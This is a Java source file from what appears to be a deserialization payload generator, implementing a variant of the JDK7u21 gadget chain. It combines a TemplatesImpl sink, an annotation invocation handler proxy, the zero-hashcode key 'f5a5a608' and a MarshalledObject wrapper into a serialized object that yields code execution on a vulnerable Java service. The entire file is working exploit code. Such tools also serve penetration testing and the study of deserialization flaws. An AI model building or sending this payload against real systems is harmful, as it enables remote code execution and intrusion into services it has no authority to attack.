package com.ppp.chain.jdk;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.rmi.MarshalledObject;
import java.util.HashMap;
import java.util.LinkedHashSet;

/**
 * @author Whoopsunix
 */
@Dependencies({"JDK:JDK7u21"})
@Authors({Authors.POTATS0})
@Sink({Sink.TemplatesImpl})
public class JDK7u21variant implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(JDK7u21variant.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        String s = RanDomUtils.generateRandomString(1);

        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, s);

        InvocationHandler handler = KickOff.annotationInvocationHandler(map);
        Reflections.setFieldValue(handler, "type", Templates.class);
        Templates proxy = KickOff.createProxy(handler, Templates.class);

        LinkedHashSet hashset = new LinkedHashSet();
        hashset.add(templates);
        hashset.add(proxy);

        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates);

        MarshalledObject marshalledObject = new MarshalledObject(hashset);
        Reflections.setFieldValue(handler, "type", MarshalledObject.class);

        hashset = new LinkedHashSet(); // maintain order
        hashset.add(marshalledObject);
        hashset.add(proxy);
        map.put(zeroHashCodeStr, marshalledObject); // swap in real object
        return hashset;
    }
}
